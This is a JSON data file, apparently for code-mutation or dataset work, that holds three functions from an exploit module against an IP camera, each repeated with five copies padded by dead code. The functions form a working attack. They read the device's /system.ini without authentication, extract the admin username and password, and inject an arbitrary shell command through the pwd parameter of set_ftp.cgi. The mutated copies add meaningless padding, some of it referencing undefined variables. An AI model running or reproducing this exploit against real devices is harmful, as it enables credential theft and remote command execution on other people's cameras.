[
    {
        "func_name": "run",
        "original": "def run(self):\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Invoking command loop...')\n        print_status('It is blind command injection - response is not available. Use reverse_tcp <reverse ip> <port>')\n        shell(self, architecture='mipsbe', method='wget', location='/tmp')\n    else:\n        print_error('Exploit failed. Device seems to be not vulnerable.')",
        "mutated": [
            "def run(self):\n    if False:\n        i = 10\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Invoking command loop...')\n        print_status('It is blind command injection - response is not available. Use reverse_tcp <reverse ip> <port>')\n        shell(self, architecture='mipsbe', method='wget', location='/tmp')\n    else:\n        print_error('Exploit failed. Device seems to be not vulnerable.')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Invoking command loop...')\n        print_status('It is blind command injection - response is not available. Use reverse_tcp <reverse ip> <port>')\n        shell(self, architecture='mipsbe', method='wget', location='/tmp')\n    else:\n        print_error('Exploit failed. Device seems to be not vulnerable.')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Invoking command loop...')\n        print_status('It is blind command injection - response is not available. Use reverse_tcp <reverse ip> <port>')\n        shell(self, architecture='mipsbe', method='wget', location='/tmp')\n    else:\n        print_error('Exploit failed. Device seems to be not vulnerable.')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Invoking command loop...')\n        print_status('It is blind command injection - response is not available. Use reverse_tcp <reverse ip> <port>')\n        shell(self, architecture='mipsbe', method='wget', location='/tmp')\n    else:\n        print_error('Exploit failed. Device seems to be not vulnerable.')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if self.check():\n        print_success('Target is vulnerable')\n        print_status('Invoking command loop...')\n        print_status('It is blind command injection - response is not available. Use reverse_tcp <reverse ip> <port>')\n        shell(self, architecture='mipsbe', method='wget', location='/tmp')\n    else:\n        print_error('Exploit failed. Device seems to be not vulnerable.')"
        ]
    },
    {
        "func_name": "execute",
        "original": "def execute(self, cmd):\n    print_status('Extracting credentials')\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    magic_sequence_location = response.content.find(b'\\x00\\x00\\n\\n\\n\\n\\x01')\n    username_location = magic_sequence_location + 144\n    username_bytes = bytearray()\n    next_username_byte = bytes()\n    index = username_location\n    while next_username_byte != b'\\x00':\n        username_bytes.append(response.content[index])\n        next_username_byte = response.content[index + 1]\n        index = index + 1\n    username = username_bytes.decode('utf-8')\n    print_info('Username: ' + username)\n    current_byte_location = username_location + len(username_bytes)\n    null_byte = bytearray(b'\\x00')\n    current_byte = bytearray(b'\\x00')\n    while current_byte == null_byte:\n        current_byte[0] = response.content[current_byte_location].encode('utf-8')\n        current_byte_location = current_byte_location + 1\n    password_location = current_byte_location - 1\n    password_bytes = bytearray()\n    next_password_byte = bytes()\n    index = password_location\n    while next_password_byte != b'\\x00':\n        password_bytes.append(response.content[index])\n        next_password_byte = response.content[index + 1]\n        index = index + 1\n    password = password_bytes.decode('utf-8')\n    print_info('Password: ' + password)\n    command_url = '{}:{}/set_ftp.cgi?next_url=ftp.htm&loginuse={}&loginpas={}&svr=192.168.1.1&port=21&user=ftp&pwd=$({})&dir=/&mode=PORT&upload_interval=0'.format(self.target, self.port, username, password, cmd)\n    http_request(method='GET', url=command_url)\n    run_url = '{}:{}/ftptest.cgi?next_url=test_ftp.htm&loginuse={}&loginpas={}'.format(self.target, self.port, username, password)\n    http_request(method='GET', url=run_url)\n    time.sleep(2)\n    return ''",
        "mutated": [
            "def execute(self, cmd):\n    if False:\n        i = 10\n    print_status('Extracting credentials')\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    magic_sequence_location = response.content.find(b'\\x00\\x00\\n\\n\\n\\n\\x01')\n    username_location = magic_sequence_location + 144\n    username_bytes = bytearray()\n    next_username_byte = bytes()\n    index = username_location\n    while next_username_byte != b'\\x00':\n        username_bytes.append(response.content[index])\n        next_username_byte = response.content[index + 1]\n        index = index + 1\n    username = username_bytes.decode('utf-8')\n    print_info('Username: ' + username)\n    current_byte_location = username_location + len(username_bytes)\n    null_byte = bytearray(b'\\x00')\n    current_byte = bytearray(b'\\x00')\n    while current_byte == null_byte:\n        current_byte[0] = response.content[current_byte_location].encode('utf-8')\n        current_byte_location = current_byte_location + 1\n    password_location = current_byte_location - 1\n    password_bytes = bytearray()\n    next_password_byte = bytes()\n    index = password_location\n    while next_password_byte != b'\\x00':\n        password_bytes.append(response.content[index])\n        next_password_byte = response.content[index + 1]\n        index = index + 1\n    password = password_bytes.decode('utf-8')\n    print_info('Password: ' + password)\n    command_url = '{}:{}/set_ftp.cgi?next_url=ftp.htm&loginuse={}&loginpas={}&svr=192.168.1.1&port=21&user=ftp&pwd=$({})&dir=/&mode=PORT&upload_interval=0'.format(self.target, self.port, username, password, cmd)\n    http_request(method='GET', url=command_url)\n    run_url = '{}:{}/ftptest.cgi?next_url=test_ftp.htm&loginuse={}&loginpas={}'.format(self.target, self.port, username, password)\n    http_request(method='GET', url=run_url)\n    time.sleep(2)\n    return ''",
            "def execute(self, cmd):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    print_status('Extracting credentials')\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    magic_sequence_location = response.content.find(b'\\x00\\x00\\n\\n\\n\\n\\x01')\n    username_location = magic_sequence_location + 144\n    username_bytes = bytearray()\n    next_username_byte = bytes()\n    index = username_location\n    while next_username_byte != b'\\x00':\n        username_bytes.append(response.content[index])\n        next_username_byte = response.content[index + 1]\n        index = index + 1\n    username = username_bytes.decode('utf-8')\n    print_info('Username: ' + username)\n    current_byte_location = username_location + len(username_bytes)\n    null_byte = bytearray(b'\\x00')\n    current_byte = bytearray(b'\\x00')\n    while current_byte == null_byte:\n        current_byte[0] = response.content[current_byte_location].encode('utf-8')\n        current_byte_location = current_byte_location + 1\n    password_location = current_byte_location - 1\n    password_bytes = bytearray()\n    next_password_byte = bytes()\n    index = password_location\n    while next_password_byte != b'\\x00':\n        password_bytes.append(response.content[index])\n        next_password_byte = response.content[index + 1]\n        index = index + 1\n    password = password_bytes.decode('utf-8')\n    print_info('Password: ' + password)\n    command_url = '{}:{}/set_ftp.cgi?next_url=ftp.htm&loginuse={}&loginpas={}&svr=192.168.1.1&port=21&user=ftp&pwd=$({})&dir=/&mode=PORT&upload_interval=0'.format(self.target, self.port, username, password, cmd)\n    http_request(method='GET', url=command_url)\n    run_url = '{}:{}/ftptest.cgi?next_url=test_ftp.htm&loginuse={}&loginpas={}'.format(self.target, self.port, username, password)\n    http_request(method='GET', url=run_url)\n    time.sleep(2)\n    return ''",
            "def execute(self, cmd):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    print_status('Extracting credentials')\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    magic_sequence_location = response.content.find(b'\\x00\\x00\\n\\n\\n\\n\\x01')\n    username_location = magic_sequence_location + 144\n    username_bytes = bytearray()\n    next_username_byte = bytes()\n    index = username_location\n    while next_username_byte != b'\\x00':\n        username_bytes.append(response.content[index])\n        next_username_byte = response.content[index + 1]\n        index = index + 1\n    username = username_bytes.decode('utf-8')\n    print_info('Username: ' + username)\n    current_byte_location = username_location + len(username_bytes)\n    null_byte = bytearray(b'\\x00')\n    current_byte = bytearray(b'\\x00')\n    while current_byte == null_byte:\n        current_byte[0] = response.content[current_byte_location].encode('utf-8')\n        current_byte_location = current_byte_location + 1\n    password_location = current_byte_location - 1\n    password_bytes = bytearray()\n    next_password_byte = bytes()\n    index = password_location\n    while next_password_byte != b'\\x00':\n        password_bytes.append(response.content[index])\n        next_password_byte = response.content[index + 1]\n        index = index + 1\n    password = password_bytes.decode('utf-8')\n    print_info('Password: ' + password)\n    command_url = '{}:{}/set_ftp.cgi?next_url=ftp.htm&loginuse={}&loginpas={}&svr=192.168.1.1&port=21&user=ftp&pwd=$({})&dir=/&mode=PORT&upload_interval=0'.format(self.target, self.port, username, password, cmd)\n    http_request(method='GET', url=command_url)\n    run_url = '{}:{}/ftptest.cgi?next_url=test_ftp.htm&loginuse={}&loginpas={}'.format(self.target, self.port, username, password)\n    http_request(method='GET', url=run_url)\n    time.sleep(2)\n    return ''",
            "def execute(self, cmd):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    print_status('Extracting credentials')\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    magic_sequence_location = response.content.find(b'\\x00\\x00\\n\\n\\n\\n\\x01')\n    username_location = magic_sequence_location + 144\n    username_bytes = bytearray()\n    next_username_byte = bytes()\n    index = username_location\n    while next_username_byte != b'\\x00':\n        username_bytes.append(response.content[index])\n        next_username_byte = response.content[index + 1]\n        index = index + 1\n    username = username_bytes.decode('utf-8')\n    print_info('Username: ' + username)\n    current_byte_location = username_location + len(username_bytes)\n    null_byte = bytearray(b'\\x00')\n    current_byte = bytearray(b'\\x00')\n    while current_byte == null_byte:\n        current_byte[0] = response.content[current_byte_location].encode('utf-8')\n        current_byte_location = current_byte_location + 1\n    password_location = current_byte_location - 1\n    password_bytes = bytearray()\n    next_password_byte = bytes()\n    index = password_location\n    while next_password_byte != b'\\x00':\n        password_bytes.append(response.content[index])\n        next_password_byte = response.content[index + 1]\n        index = index + 1\n    password = password_bytes.decode('utf-8')\n    print_info('Password: ' + password)\n    command_url = '{}:{}/set_ftp.cgi?next_url=ftp.htm&loginuse={}&loginpas={}&svr=192.168.1.1&port=21&user=ftp&pwd=$({})&dir=/&mode=PORT&upload_interval=0'.format(self.target, self.port, username, password, cmd)\n    http_request(method='GET', url=command_url)\n    run_url = '{}:{}/ftptest.cgi?next_url=test_ftp.htm&loginuse={}&loginpas={}'.format(self.target, self.port, username, password)\n    http_request(method='GET', url=run_url)\n    time.sleep(2)\n    return ''",
            "def execute(self, cmd):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    print_status('Extracting credentials')\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    magic_sequence_location = response.content.find(b'\\x00\\x00\\n\\n\\n\\n\\x01')\n    username_location = magic_sequence_location + 144\n    username_bytes = bytearray()\n    next_username_byte = bytes()\n    index = username_location\n    while next_username_byte != b'\\x00':\n        username_bytes.append(response.content[index])\n        next_username_byte = response.content[index + 1]\n        index = index + 1\n    username = username_bytes.decode('utf-8')\n    print_info('Username: ' + username)\n    current_byte_location = username_location + len(username_bytes)\n    null_byte = bytearray(b'\\x00')\n    current_byte = bytearray(b'\\x00')\n    while current_byte == null_byte:\n        current_byte[0] = response.content[current_byte_location].encode('utf-8')\n        current_byte_location = current_byte_location + 1\n    password_location = current_byte_location - 1\n    password_bytes = bytearray()\n    next_password_byte = bytes()\n    index = password_location\n    while next_password_byte != b'\\x00':\n        password_bytes.append(response.content[index])\n        next_password_byte = response.content[index + 1]\n        index = index + 1\n    password = password_bytes.decode('utf-8')\n    print_info('Password: ' + password)\n    command_url = '{}:{}/set_ftp.cgi?next_url=ftp.htm&loginuse={}&loginpas={}&svr=192.168.1.1&port=21&user=ftp&pwd=$({})&dir=/&mode=PORT&upload_interval=0'.format(self.target, self.port, username, password, cmd)\n    http_request(method='GET', url=command_url)\n    run_url = '{}:{}/ftptest.cgi?next_url=test_ftp.htm&loginuse={}&loginpas={}'.format(self.target, self.port, username, password)\n    http_request(method='GET', url=run_url)\n    time.sleep(2)\n    return ''"
        ]
    },
    {
        "func_name": "check",
        "original": "@mute\ndef check(self):\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    if response is None:\n        return False\n    if response.status_code == 200 and b'\\x00\\x00\\n\\n\\n\\n\\x01' in response.content:\n        return True\n    return False",
        "mutated": [
            "@mute\ndef check(self):\n    if False:\n        i = 10\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    if response is None:\n        return False\n    if response.status_code == 200 and b'\\x00\\x00\\n\\n\\n\\n\\x01' in response.content:\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    if response is None:\n        return False\n    if response.status_code == 200 and b'\\x00\\x00\\n\\n\\n\\n\\x01' in response.content:\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    if response is None:\n        return False\n    if response.status_code == 200 and b'\\x00\\x00\\n\\n\\n\\n\\x01' in response.content:\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    if response is None:\n        return False\n    if response.status_code == 200 and b'\\x00\\x00\\n\\n\\n\\n\\x01' in response.content:\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    response = self.http_request(method='GET', path='/system.ini?loginuse&loginpas')\n    if response is None:\n        return False\n    if response.status_code == 200 and b'\\x00\\x00\\n\\n\\n\\n\\x01' in response.content:\n        return True\n    return False"
        ]
    }
]